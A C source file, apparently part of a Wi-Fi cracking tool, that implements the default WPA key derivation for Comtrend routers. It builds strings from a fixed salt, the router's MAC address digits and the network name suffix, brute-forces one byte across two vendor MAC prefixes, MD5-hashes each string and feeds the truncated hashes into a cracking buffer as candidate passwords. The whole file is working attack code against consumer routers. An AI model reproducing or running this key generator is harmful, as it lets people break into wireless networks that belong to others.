/*********************************************************************************
 * Copyright (c) 2012, Chema Garcia                                              *
 * All rights reserved.                                                          *
 *                                                                               *
 * Redistribution and use in source and binary forms, with or                    *
 * without modification, are permitted provided that the following               *
 * conditions are met:                                                           *
 *                                                                               *
 *    * Redistributions of source code must retain the above                     *
 *      copyright notice, this list of conditions and the following              *
 *      disclaimer.                                                              *
 *                                                                               *
 *    * Redistributions in binary form must reproduce the above                  *
 *      copyright notice, this list of conditions and the following              *
 *      disclaimer in the documentation and/or other materials provided          *
 *      with the distribution.                                                   *
 *                                                                               *
 *    * Neither the name of the SafetyBits nor the names of its contributors may *
 *      be used to endorse or promote products derived from this software        *
 *      without specific prior written permission.                               *
 *                                                                               *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"   *
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE     *
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE    *
 * ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE     *
 * LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR           *
 * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF          *
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS      *
 * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN       *
 * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)       *
 * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE    *
 * POSSIBILITY OF SUCH DAMAGE.                                                   *
 *********************************************************************************/

#include <string.h>
#include <ctype.h>

#include "includes/main.h"
#include "includes/ciphers.h"
#include "includes/algorithms.h"

#include "algorithms/comtrendwpa.h"

// @todo: Brute-force essid digits
static void comtrend_cttssidmac_pwd ( const char *bssid, const char *ssid, struct crackdata *crack )
{

    char            md5final[33];
    char plain[255];
    char *p;

    unsigned char   *tmp;
    if ( ( p = strchr ( ssid , '_' ) ) == NULL )
        return;
    p++;
    memset ( plain, 0, sizeof ( plain ) );
    snprintf ( plain, sizeof ( plain ) ,"bcgbghgg%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c", bssid[0], bssid[1], bssid[3], bssid[4], bssid[6], bssid[7], bssid[9], bssid[10], bssid[12], p[1], p[2], p[3], bssid[0], bssid[1], bssid[3], bssid[4], bssid[6], bssid[7], bssid[9], bssid[10], bssid[12], bssid[13], bssid[15], bssid[16] );
    get_md5sum(plain,strlen(plain),md5final,20);

    tmp = (unsigned char*) strdup ( (char*) md5final );
    cbuffer_write(crack->buffer,(void*)tmp);

    return;
}

/** @todo agilizar el arlgoritmo, esta hecho a la prisa y corriendo  **/
// @todo: Brute-force essid digits
static void comtrend_cttethssid_pwd ( const char *bssid, const char *ssid, struct crackdata *crack )
{
    char            hbssid[13];
    char            hssid[6];
    register unsigned int    i, j, k;
    const char      ethernet[2][7] = {"64680C\0", "001D20\0"};
    char            *p, plain[255];

    char            md5final[33];
    unsigned char   *tmp;


    if ( ( p = strchr ( ssid , '_' ) ) == NULL )
        return;

    p++;

    memset ( hbssid , 0 , sizeof ( hbssid ) );
    memset ( hssid , 0 , sizeof ( hssid ) );

    j = 0;
    for ( i = 0 ; i < strlen ( bssid ) ; i++ )
        if ( bssid[i] != ':' )
            hbssid[j++] = toupper ( bssid [i] );

    j = 0;
    for ( i = 0 ; i < strlen ( p ) ; i++ )
        hssid[j++] = toupper ( p[i] );

    for ( i = 0 ; i <= 0xFF && !crack->net->pwd.checked; i++ )
        for ( k = 0 ; k < 2 ; k++ )
        {
            memset ( plain , 0 , sizeof ( plain ) );
            snprintf ( plain , sizeof ( plain ) , "bcgbghgg%s%02X%s%s" , ethernet[k] , i , hssid , hbssid );
            get_md5sum(plain,strlen(plain),md5final,20);

            tmp = (unsigned char*) strdup ( (char*) md5final );
            cbuffer_write(crack->buffer,(void*)tmp);
        }

    tmp = (unsigned char*) strdup ( (char*) md5final );
    cbuffer_write(crack->buffer,(void*)tmp);

    return;
}

void comtrend_pwd ( struct crackdata *crack , unsigned int pattern )
{
    switch ( pattern )
    {
    case COMTREND_MODEL_WPASSID:
        comtrend_cttethssid_pwd ( crack->net->bssid , crack->net->essid , crack );
        break;

    default:
        comtrend_cttssidmac_pwd ( crack->net->bssid , crack->net->essid , crack );
        break;
    }

    return;
}
